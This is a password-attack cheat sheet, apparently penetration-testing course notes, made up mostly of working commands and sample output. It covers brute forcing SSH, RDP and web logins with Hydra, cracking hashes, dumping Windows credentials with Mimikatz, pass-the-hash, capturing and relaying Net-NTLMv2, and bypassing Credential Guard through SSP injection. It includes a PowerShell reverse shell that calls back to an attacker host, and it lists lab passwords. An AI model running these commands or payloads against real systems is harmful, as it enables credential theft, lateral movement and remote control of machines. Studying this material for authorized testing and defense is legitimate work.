# Password Attacks

## Overview

Passwords continue to be the primary authentication method across most systems and services. This cheat sheet covers various techniques used to compromise password-based security mechanisms, from targeting live network services to cracking stored password hashes.

This reference guide covers the following sections:

- Attacking Network Service Logins
- Password Cracking Fundamentals
- Working with Password Hashes

This document provides practical commands, tools, and techniques for testing password strength through network-based attacks, different password cracking approaches, and Windows hash extraction and manipulation.

## Table of Contents

- [1. Attacking Network Service Logins](#1-attacking-network-service-logins)
- [2. Password Cracking Fundamentals](#2-password-cracking-fundamentals)
- [3. Working with Password Hashes](#3-working-with-password-hashes)

---

## 1. Attacking Network Service Logins

Network services with authentication mechanisms are primary targets for credential attacks. Two main approaches exist: brute-force attacks (testing all possible combinations) and dictionary attacks (using wordlists of common passwords).

### 1.1 SSH Attacks

**Target Verification**
```bash
# Check SSH service availability
nmap -sV -p 2222 target_ip
```

**Dictionary Attack with Hydra**
```bash
# Prepare rockyou wordlist
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz

# Single user attack
hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://target_ip

# Multiple users attack
hydra -L users.txt -P passwords.txt ssh://target_ip
```

**Key Parameters**
- `-l`: Single username
- `-L`: Username list file
- `-P`: Password list file
- `-s`: Custom port
- `-t`: Number of parallel tasks

### 1.2 RDP Password Spraying

Password spraying uses one password against multiple usernames, effective when passwords are obtained from breaches or leaks.

**Prepare Username List**
```bash
# Add usernames to existing list
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
```

**Execute Password Spray**
```bash
# Single password against username list
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password123" rdp://target_ip

# Custom username list
hydra -L custom_users.txt -p "SuperS3cure1337#" rdp://target_ip
```

**Considerations**
- Account lockout policies may trigger after failed attempts
- Dictionary attacks generate significant logs and network traffic
- Limit attack scope to avoid production system disruption

### 1.3 HTTP POST Login Forms

Web application login forms require additional reconnaissance to capture request format and failure indicators.

**Information Gathering**
1. Intercept login request with Burp Suite
2. Identify POST request body format
3. Capture failed login response message

**Example Request Analysis**
```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

fm_usr=user&fm_pwd=password
```

**Failed Login Indicator**
```
"Login failed. Invalid username or password"
```

**Hydra HTTP POST Attack**
```bash
# Basic HTTP POST form attack
hydra -l user -P /usr/share/wordlists/rockyou.txt target_ip http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"

# With custom parameters
hydra -l admin -P passwords.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

**HTTP POST Form Syntax**
```
http-post-form "path:post_body:failure_string"
```
- `path`: Location of login form
- `post_body`: Request body with ^USER^ and ^PASS^ placeholders
- `failure_string`: Text indicating failed login

**Common Default Accounts**
- Web applications: admin, user, administrator
- Linux systems: root
- Windows systems: Administrator

**Defense Considerations**
- Web Application Firewalls (WAF) detect and block brute force attempts
- fail2ban and similar tools lock accounts after failed attempts
- Rate limiting and CAPTCHA mechanisms prevent automated attacks

---

## 2. Password Cracking Fundamentals

Password cracking attacks target stored password hashes rather than live authentication services. Unlike network attacks, hash cracking doesn't generate network traffic, lock accounts, or trigger traditional defensive mechanisms.

### 2.1 Encryption vs Hashing

**Encryption** (Two-way function)
- Symmetric: Same key for encryption/decryption (AES)
- Asymmetric: Public/private key pairs (RSA)
- Reversible with correct key

**Hashing** (One-way function)
- Fixed-length output regardless of input size
- Same input always produces same hash
- Computationally infeasible to reverse
- Examples: MD5, SHA1, SHA256

**Hash Verification Example**
```bash
# Generate hash examples
echo -n "secret" | sha256sum
echo -n "secret1" | sha256sum

# Compare outputs
# secret:  2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b
# secret1: 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
```

### 2.2 Tool Comparison

**Hashcat**
- Primarily GPU-based
- Requires OpenCL or CUDA drivers
- Faster for most algorithms
- Better for modern hash types

**John the Ripper (JtR)**
- CPU-focused with GPU support
- Works without additional drivers
- Better for complex/slow algorithms (bcrypt)
- Better SSH key support

### 2.3 Cracking Time Calculation

**Formula**: Cracking Time = Keyspace ÷ Hash Rate

**Keyspace Calculation**
```bash
# Character set size
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
# Output: 62

# 5-character password keyspace
python3 -c "print(62**5)"
# Output: 916132832

# 8-character password keyspace  
python3 -c "print(62**8)"
# Output: 218340105584896
```

**Benchmark Hash Rates**
```bash
# Test system capabilities
hashcat -b

# Example GPU vs CPU comparison (SHA256):
# GPU: 9,276.3 MH/s
# CPU: 134.2 MH/s
```

**Time Calculations**
```bash
# 5-character password (SHA256)
python3 -c "print(916132832 / 9276300000)"  # GPU: ~0.1 seconds
python3 -c "print(916132832 / 134200000)"   # CPU: ~6.8 seconds

# 8-character password (SHA256)  
python3 -c "print(218340105584896 / 9276300000)"  # GPU: ~6.5 hours
```

### 2.4 Rule-Based Attacks

Rules mutate existing passwords to match password policies without expanding wordlists manually.

**Basic Rule Functions**
- `c`: Capitalize first character
- `$X`: Append character X
- `^X`: Prepend character X
- `$1`: Append "1"
- `$!`: Append "!"

**Create Custom Rules**
```bash
# Simple rule file
echo \$1 > demo.rule

# Test rule on wordlist
hashcat -r demo.rule --stdout demo.txt

# Multiple functions (same line = consecutive)
echo '$1 c $!' > complex.rule

# Multiple rules (separate lines = different mutations)
cat > multi.rule << EOF
$1 c $!
$2 c $@
$1$2$3 c $#
EOF
```

**Rule Execution Example**
```bash
# Create demo wordlist
cat > demo.txt << EOF
password
princess
computer
EOF

# Apply capitalization + append "1" + append "!"
hashcat -r demo.rule --stdout demo.txt
# Output: Password1!, Princess1!, Computer1!
```

**Practical Hash Cracking**
```bash
# Crack MD5 hash with rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rule.file --force

# Example with specific hash
echo "f621b6c9eab51a3e2f4e167fee4c6860" > target.hash
hashcat -m 0 target.hash rockyou.txt -r custom.rule --force
```

**Predefined Rules Location**
```bash
ls -la /usr/share/hashcat/rules/
# Key files:
# best64.rule - General purpose
# rockyou-30000.rule - Optimized for rockyou.txt
# dive.rule - Comprehensive mutations
```

### 2.5 Cracking Methodology

**Step 1: Extract Hashes**
- Database dumps
- Configuration files  
- Memory dumps
- Network captures

**Step 2: Format Hashes**
```bash
# Identify hash type
hashid hash_value
hash-identifier

# Format for tools
keepass2john Database.kdbx > keepass.hash
ssh2john id_rsa > ssh.hash
```

**Step 3: Calculate Cracking Time**
- Determine feasibility
- Consider hardware limitations
- Plan timeline within engagement scope

**Step 4: Prepare Wordlist**
- Research password policies
- Create targeted rules
- Use multiple wordlists if needed

**Step 5: Execute Attack**
- Verify hash format
- Confirm hash type
- Monitor progress

### 2.6 Password Manager Attacks

**KeePass Database Cracking**
```bash
# Find database files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Format for cracking
keepass2john Database.kdbx > keepass.hash

# Remove filename prefix
sed -i 's/^[^:]*://' keepass.hash

# Identify hash mode
hashcat --help | grep -i "keepass"
# Mode: 13400

# Crack with rules
hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### 2.7 SSH Private Key Passphrase

**Extract and Format**
```bash
# Convert private key to hash
ssh2john id_rsa > ssh.hash

# Remove filename prefix
sed -i 's/^[^:]*://' ssh.hash

# Determine mode ($6$ = mode 22921)
hashcat -h | grep -i "ssh"
```

**Create Targeted Rules**
```bash
# Based on password policy: 3 numbers, capital letter, special character
cat > ssh.rule << EOF
c $1 $3 $7 $!
c $1 $3 $7 $@  
c $1 $3 $7 $#
EOF

# Create custom wordlist from intelligence
cat > ssh.passwords << EOF
window
dave
superdave
umbrella
EOF
```

**Handle Tool Limitations**
```bash
# If Hashcat fails with "Token length exception"
# Use John the Ripper instead

# Add rules to John configuration
cat >> /etc/john/john.conf << EOF
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
EOF

# Crack with John
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

**Use Cracked Passphrase**
```bash
# Set correct permissions
chmod 600 id_rsa

# Connect with private key
ssh -i id_rsa -p 2222 user@target_ip
# Enter passphrase when prompted
```

### Key Considerations

- **Password Policies**: Research target requirements (length, complexity, special characters)
- **Human Behavior**: Users append numbers/symbols, capitalize first letter
- **Tool Selection**: Use multiple tools for different hash types and scenarios
- **Time Management**: Balance cracking time with engagement duration
- **Hardware**: Consider GPU upgrades or cloud instances for intensive tasks

---

## 3. Working with Password Hashes

Windows password hashes can be extracted from compromised systems and used for credential recovery or lateral movement attacks. This section covers NTLM hash extraction, cracking, and exploitation techniques.

### 3.1 Cracking NTLM

NTLM hashes are stored in the Windows Security Account Manager (SAM) database and can be extracted from memory or registry for offline cracking.

**NTLM Hash Characteristics**
- Case-sensitive passwords
- No length splitting (unlike LM)
- Not salted (vulnerable to rainbow tables)
- Stored in SAM database and LSASS memory
- 32-character hexadecimal format

**Hash Storage Locations**
- **SAM Database**: `C:\Windows\System32\config\SAM`
- **LSASS Memory**: Local Security Authority Subsystem process
- **NTDS.dit**: Active Directory database (Domain Controllers)

**Prerequisites for Hash Extraction**
- Administrator privileges or higher
- SeDebugPrivilege access right enabled
- SYSTEM-level access for memory extraction

**Mimikatz Hash Extraction**

Check Local Users:
```powershell
# Enumerate local users
Get-LocalUser
```

Extract NTLM Hashes:
```cmd
# Start PowerShell as Administrator
# Navigate to Mimikatz location
cd C:\tools
.\mimikatz.exe

# Enable debug privileges
mimikatz # privilege::debug

# Elevate to SYSTEM
mimikatz # token::elevate

# Extract SAM hashes
mimikatz # lsadump::sam

# Extract from LSASS memory
mimikatz # sekurlsa::logonpasswords
```

**Alternative Extraction Methods**

Registry Extraction:
```cmd
# Save registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Transfer to attacking machine for processing
```

**Hash Format and Identification**
```
Format: 32 hexadecimal characters
Example: 3ae8e5f0ffabb3a627672e1600f1ba10
Location in output: Hash NTLM: [hash]
```

**Hashcat NTLM Cracking**

Identify Hash Mode:
```bash
# Find NTLM mode in Hashcat
hashcat --help | grep -i "ntlm"
# Mode 1000 = NTLM
```

Prepare Hash File:
```bash
# Create hash file
echo "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash
```

Execute Cracking:
```bash
# Basic dictionary attack
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt

# With rules for mutations
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Brute force attack (short passwords)
hashcat -m 1000 -a 3 nelly.hash ?a?a?a?a?a?a?a?a

# Incremental brute force
hashcat -m 1000 -a 3 nelly.hash ?a?a?a?a?a?a?a?a --increment --increment-min=4 --increment-max=8
```

**John the Ripper NTLM Cracking**
```bash
# Format for John
john --format=NT nelly.hash

# With wordlist
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt nelly.hash

# With rules
john --format=NT --wordlist=rockyou.txt --rules nelly.hash

# Show cracked passwords
john --format=NT --show nelly.hash
```

**NTLM vs LM Comparison**
```
LM Hash Characteristics:
- Maximum 14 characters
- Case insensitive
- Split into 7-character halves
- DES-based (weak)
- Disabled by default (Vista+)

NTLM Hash Characteristics:
- No length limit
- Case sensitive
- No splitting
- MD4-based
- Not salted
- Standard on modern Windows
```



**Post-Cracking Verification**
```bash
# Test credentials via RDP
xfreerdp /u:username /p:password /v:target_ip

# Test via SMB
smbclient //target_ip/share -U username%password

# Test via WinRM
evil-winrm -i target_ip -u username -p password
```

**Troubleshooting**
- Ensure hash format is correct (32 hex characters)
- Verify Hashcat mode selection (1000 for NTLM)
- Use --force flag if needed for compatibility
- Validate privileges when extracting hashes

This NTLM cracking process is essential for both standalone systems and Active Directory environments, providing a foundation for credential recovery and lateral movement techniques.

### 3.2 Passing NTLM

Pass-the-Hash (PtH) allows authentication using NTLM hashes instead of plaintext passwords. This technique exploits the fact that NTLM hashes are not salted and remain static between sessions.

**Pass-the-Hash Fundamentals**
- NTLM hashes can authenticate without cracking
- Works across systems with same username/password
- Requires administrative privileges for code execution
- Bypasses password complexity requirements

**UAC Remote Restrictions**
- Enabled by default since Windows Vista
- Prevents remote administrative access for local admin accounts
- Exception: Built-in Administrator account (RID 500)
- Mitigates PtH for standard admin users

**NTLM Hash Extraction for PtH**

Extract Administrator Hash:
```cmd
# In Mimikatz on compromised system
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Example output:
# RID  : 000001f4 (500)
# User : Administrator
# Hash NTLM: 7a38310ea6f0027ee955abed1762964b
```

**SMB Share Access with PtH**

Using smbclient:
```bash
# Connect to SMB share with NTLM hash
smbclient \\\\target_ip\\share -U Administrator --pw-nt-hash NTLM_HASH

# Example
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# SMB commands
smb: \> dir                    # List directory contents
smb: \> get filename           # Download file
smb: \> put filename           # Upload file
```

**Interactive Shell Access with PtH**

Impacket psexec (SYSTEM shell):
```bash
# Format: LMHash:NTHash (use 32 zeros for LM)
impacket-psexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@target_ip

# Example
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

# Results in SYSTEM-level shell
```

Impacket wmiexec (User context shell):
```bash
# Same format as psexec
impacket-wmiexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@target_ip

# Example
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

# Results in Administrator user shell
```

**Other PtH Tools and Methods**

CrackMapExec:
```bash
# SMB authentication test
crackmapexec smb target_ip -u Administrator -H NTLM_HASH

# Command execution
crackmapexec smb target_ip -u Administrator -H NTLM_HASH -x "whoami"

# Multiple targets
crackmapexec smb targets.txt -u Administrator -H NTLM_HASH
```

Evil-WinRM (if WinRM enabled):
```bash
# Connect via WinRM with hash
evil-winrm -i target_ip -u Administrator -H NTLM_HASH
```

RDP with PtH (using xfreerdp):
```bash
# RDP connection with hash (if RDP allows)
xfreerdp /v:target_ip /u:Administrator /pth:NTLM_HASH
```

**Hash Format Requirements**
```
NTLM Hash: 32 hexadecimal characters
LM Hash: 32 hexadecimal characters (use zeros if not available)
Combined Format: LMHash:NTLMHash
Example: 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
```

**Common PtH Scenarios**
- Local Administrator password reuse across systems
- Service account with admin rights on multiple machines
- Domain admin compromise for lateral movement
- Workstation to server privilege escalation

**PtH Attack Requirements**
- Valid NTLM hash
- Target system with matching user account
- Administrative privileges on target (for code execution)
- Network connectivity to target service (SMB, WinRM, RDP)

**Detection Evasion**
- PtH generates same logs as normal authentication
- Monitor for unusual login patterns
- Look for authentication from unexpected sources
- Detect lateral movement patterns

Pass-the-Hash is a fundamental lateral movement technique that exploits Windows authentication design, allowing attackers to move between systems without needing to crack password hashes.

### 3.3 Cracking Net-NTLMv2

Net-NTLMv2 is a challenge-response authentication protocol used when accessing network resources. Unlike NTLM hashes stored locally, Net-NTLMv2 hashes can be captured during network authentication and cracked offline.

**Net-NTLMv2 Authentication Process**
1. Client requests access to network resource
2. Server sends challenge to client
3. Client encrypts challenge with NTLM hash (response)
4. Server validates response against stored hash
5. Access granted or denied based on validation

**Protocol Usage Scenarios**
- SMB share access over network
- Legacy systems not supporting Kerberos
- Cross-domain authentication in mixed environments
- File upload forms supporting UNC paths

**Capturing Net-NTLMv2 Hashes with Responder**

Setup Responder SMB Server:
```bash
# Check network interface
ip a

# Start Responder on interface
sudo responder -I tap0

# Verify SMB server is active
# Output shows: SMB server [ON]
```

**Force Authentication from Target**

From Compromised System:
```cmd
# Trigger SMB authentication to Responder
dir \\attacker_ip\share

# Example commands that trigger authentication
dir \\192.168.119.2\test
ls \\192.168.119.2\share
copy file.txt \\192.168.119.2\share\
```

PowerShell Authentication Trigger:
```powershell
# Various methods to force authentication
ls \\attacker_ip\share
Get-ChildItem \\attacker_ip\share
Test-Path \\attacker_ip\share\file.txt
```

**Alternative Authentication Triggers**
- File upload forms with UNC path support
- Image/document references in web applications
- Email signatures with UNC image paths
- Desktop shortcuts pointing to network locations

**Captured Hash Format**
```
Format: username::domain:challenge:response
Example: paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...

Components:
- Username: paul
- Domain: FILES01
- Challenge: 1f9d4c51f6e74653
- Response: 795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...
```

**Hashcat Net-NTLMv2 Cracking**

Identify Hash Mode:
```bash
# Find NetNTLMv2 mode
hashcat --help | grep -i "ntlm"
# Mode 5600 = NetNTLMv2
```

Save and Crack Hash:
```bash
# Save captured hash to file
cat > paul.hash << 'EOF'
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057004E002D00340044004E004800550058004300340054004900430002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000
EOF

# Basic dictionary attack
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

# With rules for password mutations
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**John the Ripper Net-NTLMv2 Cracking**
```bash
# Crack with John
john --format=netntlmv2 paul.hash

# With wordlist
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt paul.hash

# Show cracked passwords
john --format=netntlmv2 --show paul.hash
```

**Responder Hash Capture Output**
```
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...
```

**Post-Crack Verification**
```bash
# Test credentials via RDP
xfreerdp /u:paul /p:cracked_password /v:target_ip

# Test via SMB
smbclient //target_ip/share -U paul%cracked_password

# Test via WinRM (if enabled)
evil-winrm -i target_ip -u paul -p cracked_password
```

**Net-NTLMv2 vs NTLM Differences**
```
NTLM Hash:
- Stored locally in SAM/LSASS
- Static hash value
- Direct authentication possible (PtH)
- 32 hex characters

Net-NTLMv2 Hash:
- Generated during network authentication
- Challenge-response based
- Contains timestamp and challenge
- Cannot be used for direct authentication
- Must be cracked to obtain password
```

**Common Attack Scenarios**
- Unprivileged access to Windows systems
- Web applications with file upload functionality
- Phishing emails with UNC path references
- Network file shares requiring authentication

**Mitigation Considerations**
- SMB signing enforcement
- Network segmentation
- Disable LLMNR/NBT-NS when possible
- Monitor for suspicious authentication patterns

Net-NTLMv2 capture and cracking provides a valuable attack vector when direct hash extraction is not possible, allowing password recovery from network authentication attempts.

### 3.4 Relaying Net-NTLMv2

Net-NTLMv2 relay attacks forward captured authentication attempts to another system instead of cracking the hash. This technique leverages user privileges across multiple systems when the hash is too complex to crack.

**Relay Attack Concept**
- Forward authentication to target system instead of cracking
- Leverage cross-system administrative privileges
- Effective when user has admin rights on multiple machines
- Bypass UAC remote restrictions (for built-in Administrator)

**PowerShell Reverse Shell Preparation**
```powershell
# Generate base64 encoded PowerShell reverse shell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<local ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit
```

**ntlmrelayx Setup**
```bash
# Basic relay setup with command execution
impacket-ntlmrelayx --no-http-server -smb2support -t <target ip to compromise> -c "powershell -enc BASE64_PAYLOAD"

# Start netcat listener for reverse shell
nc -nvlp 4444
```

**Triggering the Relay**
```cmd
# From compromised system - force SMB authentication
dir \\<local ip>\test
```

**Relay Attack Output**
```
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] Executed specified command on host: 192.168.50.212
```

**Requirements for Success**
- Target user must have admin privileges on destination system
- UAC remote restrictions must be disabled (except for built-in Administrator)
- SMB connectivity between systems required

### 3.5 Windows Credential Guard

Windows Credential Guard is a security feature that protects domain credentials by storing them in a virtualized, isolated environment. This mitigation prevents traditional hash extraction techniques from accessing cached domain credentials.

**Credential Storage Differences**
- **Local accounts**: Stored in SAM database
- **Domain accounts**: Cached in LSASS memory (without Credential Guard)
- **With Credential Guard**: Domain credentials isolated in VTL1

**Domain Credential Extraction (No Credential Guard)**
```cmd
# RDP to target as domain user
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246

# Extract cached domain credentials with Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Example output shows domain hash:
# Domain : CORP
# NTLM   : 160c0b16dd0ee77e7c494e38252f7ddf
```

**Pass-the-Hash with Domain Credentials**
```bash
# Use extracted domain hash for lateral movement
impacket-wmiexec -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
```

**Virtualization-Based Security (VBS)**
- Runs hypervisor on physical hardware
- Creates isolated memory regions (Virtual Trust Levels)
- **VTL0**: Normal Windows environment
- **VTL1**: Secure isolated environment for critical functions

**Credential Guard Implementation**
- LSASS runs as LSAISO.exe trustlet in VTL1
- Communicates with LSASS.exe in VTL0 via RPC
- Domain credentials encrypted and inaccessible from VTL0

**Checking Credential Guard Status**
```powershell
# Verify Credential Guard is enabled
Get-ComputerInfo

# Key indicators:
# DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
# HyperVisorPresent                  : True
```

**Credential Guard Impact on Mimikatz**
```cmd
# Mimikatz output with Credential Guard enabled
mimikatz # sekurlsa::logonpasswords

# Domain user shows encrypted data:
# LSA Isolated Data: NtlmHash
# KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
# Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d

# Local users still accessible
```

**Bypassing Credential Guard with SSP Injection**

Security Support Provider (SSP) Concept:
- SSPI handles all Windows authentication
- SSPs loaded as DLLs during system startup
- Can register custom SSPs via AddSecurityPackage API
- SSPs receive plaintext credentials during authentication

**Mimikatz SSP Injection**
```cmd
# Inject malicious SSP into LSASS memory
mimikatz # privilege::debug
mimikatz # misc::memssp

# Output: Injected =)
# SSP will capture future authentication attempts
```

**Credential Capture Process**
1. Inject SSP with Mimikatz
2. Wait for user authentication (RDP, login, etc.)
3. Check captured credentials in log file

**Retrieving Captured Credentials**
```cmd
# Check captured plaintext credentials
type C:\Windows\System32\mimilsa.log

# Example output:
# [00000000:00af2311] CORP\Administrator  QWERTY123!@#
# [00000000:00b1dd77] CLIENTWK245\offsec  lab
```

**Complete Credential Guard Bypass Workflow**
```cmd
# Step 1: Verify Credential Guard is enabled
Get-ComputerInfo | findstr CredentialGuard

# Step 2: Inject SSP
mimikatz # privilege::debug
mimikatz # misc::memssp

# Step 3: Trigger authentication (social engineering, wait for logins)
# User connects via RDP or authenticates

# Step 4: Retrieve captured credentials
type C:\Windows\System32\mimilsa.log
```

**Credential Guard Limitations**
- Only protects domain credentials
- Local account hashes still accessible
- SSP injection bypasses protection
- Requires user authentication after injection

**Key Characteristics**
- **Enabled by default**: Modern Windows installations
- **Legacy systems**: Disabled on updated (not fresh install) systems
- **Protection scope**: Domain credentials only
- **Bypass method**: SSP injection for plaintext capture

Windows Credential Guard significantly raises the bar for credential theft but can be bypassed through SSP injection techniques that capture plaintext credentials during the authentication process.